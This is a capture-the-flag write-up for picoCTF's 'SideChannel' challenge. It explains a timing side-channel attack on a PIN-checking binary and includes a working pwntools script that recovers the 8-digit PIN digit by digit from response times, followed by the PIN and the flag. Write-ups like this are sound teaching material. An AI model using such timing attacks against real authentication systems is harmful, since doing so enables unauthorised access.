## SideChannel  

<img src="images/chall.png" width=600>

We are given a binary that prompts us for an 8-digit PIN.  

<img src="images/program.png" width=600>

The challenge name already gives away the main vuln in this chall. It would thus be logical to assume that the binary checks the PIN character by character, and terminates early when it encounters an incorrect digit.  

We can write a script that performs a timing-based side channel attack on the dist binary by incrementally guessing each successive digit.  

To improve the accuracy of our measurements, we can sample the timing of `10` guesses for every digit at each index, then take the median duration.   

```python
from pwn import *
import time
from statistics import median

pin = ""

while len(pin) < 8:
    times = {}
    
    for i in range(0, 10):
        samples = []

        for _ in range(10):
            p = process("./pin_checker")
            guess = f'{pin}{i}'.ljust(8, '0')

            p.info(f"Trying: {guess}")
            
            start = time.perf_counter()
            p.sendlineafter(b':', guess.encode())
            p.recvall()
            end = time.perf_counter()

            samples.append(end - start)

            p.close()
    
        times[i] = median(samples)
    
    pin += str(max(times, key=lambda x: times[x]))

print("Pin:", pin)
```

After some bruteforcing, the script will output `48390513`, which we can submit to the chall server to obtain our flag.  

<img src="images/flag.png" width=600>

Flag: `picoCTF{t1m1ng_4tt4ck_eb4d7efb}`